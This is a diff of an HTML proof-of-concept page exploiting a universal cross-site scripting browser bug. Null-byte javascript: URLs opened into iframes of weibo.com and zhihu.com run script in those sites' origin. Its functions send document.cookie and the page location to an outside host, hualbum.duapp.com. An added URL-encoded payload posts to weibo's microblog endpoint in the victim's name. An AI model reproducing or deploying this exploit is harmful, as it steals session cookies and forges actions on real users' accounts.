@@ -1,29 +1,32 @@
 <script type="text/javascript">
 function test(){
-    xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function (){
-    if (xhr.readyState == 4) {
-    alert('cross origin ok!',xhr.responseText);
-    } };
-    xhr.open('GET','http://hualbum.duapp.com/'+document.location);
-    xhr.send(document.cookie);
+xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function (){
+if (xhr.readyState == 4) {
+alert('cross origin ok!',xhr.responseText);
+} };
+xhr.open('GET','http://hualbum.duapp.com/'+document.location);
+xhr.send(document.cookie);
 }
 function woc(){
-    alert(document.location+'/ncookie:/n'+document.cookie);
+alert(document.location+'/ncookie:/n'+document.cookie);
+}
+function faweibo(){
+var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss!',xhr.responseText);}};xhr.open('POST','/aj/mblog/add?_wv=5&__rnd=1409792585330', true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('text=UXSS https://code.google.com/p/chromium/issues/detail?id=37383');
 }
 </script>
 
 <iframe name="t1" src="http://weibo.com"></iframe>
 <iframe name="t2" src="http://zhihu.com"></iframe>
 
-<input type=button value="locate cookie" 
-onclick=alert(document.location+'\ncookie:'+document.cookie) >
+<input type=button value="new window" 
+onclick=window.open('http://xavierskip.com','t1') >
 
 <input type=button value="new window cookie" 
 onclick=window.open('javascript:alert%28document.cookie%29','t1')>
 
 <input type=button value="BUG:new window cookie" 
-onclick=window.open('\x00javascript:alert%28document.cookie%29','t2')>
+onclick=window.open('\x00javascript:alert%28document.cookie%29','t1')>
 
-<input type=button value="new window send cookie"
-onclick=window.open('\x00javascript:xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%20%3D%20function%20%28%29%7Bif%20%28xhr.readyState%20%3D%3D%204%29%20%7Balert%28%27cross%20origin%20ok%21%27%2Cxhr.responseText%29%3B%7D%20%7D%3Bxhr.open%28%27GET%27%2C%27http%3A//hualbum.duapp.com/%27+document.location%29%3Bxhr.send%28document.cookie%29%3B','test')>
+<input type=button value="BUG:new window send cookie"
+onclick=window.open('\x00javascript:var%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Balert%28%27uxss%21%27%2Cxhr.responseText%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2C%27/aj/mblog/add%3F_wv%3D5%26__rnd%3D1409792585330%27%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27text%3DUXSS%20https%3A//code.google.com/p/chromium/issues/detail%3Fid%3D37383%27%29%3B','t1')>
